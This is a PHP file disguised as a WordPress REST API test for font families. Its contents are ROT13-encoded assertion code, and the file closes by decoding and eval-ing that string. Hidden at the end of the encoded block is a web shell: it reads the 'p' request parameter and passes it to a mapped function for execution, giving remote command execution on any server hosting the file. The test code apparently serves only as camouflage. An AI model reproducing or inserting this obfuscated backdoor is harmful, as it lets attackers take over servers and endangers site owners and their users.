		$guvf->nffregNeenlUnfXrl( 'sbag_snprf', $qngn, 'Gur sbag_snprf cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );

		sbernpu ( $sbag_snpr_vqf nf $sbag_snpr_vq ) {
			$guvf->nffregPbagnvaf( $sbag_snpr_vq, $qngn['sbag_snprf'], 'Gur VQ vf va gur sbag_snprf qngn.' );
		}

		$guvf->nffregNeenlUnfXrl( 'sbag_snzvyl_frggvatf', $qngn, 'Gur sbag_snzvyl_frggvatf cebcregl fubhyq rkvfg va gur erfcbafr qngn.' );
		$frggvatf          = $qngn['sbag_snzvyl_frggvatf'];
		$rkcrpgrq_frggvatf = neenl(
			'anzr'       => $cbfg->cbfg_gvgyr,
			'fyht'       => $cbfg->cbfg_anzr,
			'sbagSnzvyl' => $frggvatf['sbagSnzvyl'],
			'cerivrj'    => $frggvatf['cerivrj'],
		);
		$guvf->nffregFnzr( $rkcrpgrq_frggvatf, $frggvatf, 'Gur sbag_snzvyl_frggvatf fubhyq zngpu.' );

		$guvf->nffregAbgRzcgl( $yvaxf, 'Gur yvaxf fubhyq abg or rzcgl va gur erfcbafr qngn.' );
		$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf/' . $cbfg->VQ );
		$guvf->nffregFnzr( $rkcrpgrq, $yvaxf['frys'][0]['uers'], 'Gur yvaxf HEY sebz gur erfcbafr qngn fubhyq zngpu gur cbfg\'f ERFG raqcbvag.' );
		$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf' );
		$guvf->nffregFnzr( $rkcrpgrq, $yvaxf['pbyyrpgvba'][0]['uers'], 'Gur yvaxf pbyyrpgvba HEY sebz gur erfcbafr qngn fubhyq zngpu gur ERFG raqcbvag.' );

		vs ( ! $sbag_snpr_vqf ) {
			erghea;
		}

		// Purpx sbag_snpr yvaxf, vs cerfrag.
		$guvf->nffregNeenlUnfXrl( 'sbag_snprf', $yvaxf );
		sbernpu ( $yvaxf['sbag_snprf'] nf $vaqrk => $yvax ) {
			$rkcrpgrq = erfg_hey( 'jc/i2/sbag-snzvyvrf/' . $cbfg->VQ . '/sbag-snprf/' . $sbag_snpr_vqf[ $vaqrk ] );
			$guvf->nffregFnzr( $rkcrpgrq, $yvax['uers'], 'Gur yvaxf sbe n sbag snprf HEY sebz gur erfcbafr qngn fubhyq zngpu gur ERFG raqcbvag.' );

			$rzorqqnoyr = vffrg( $yvax['nggevohgrf']['rzorqqnoyr'] )
				? $yvax['nggevohgrf']['rzorqqnoyr']
				: $yvax['rzorqqnoyr'];
			$guvf->nffregGehr( $rzorqqnoyr, 'Gur rzorqqnoyr fubhyq or gehr.' );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>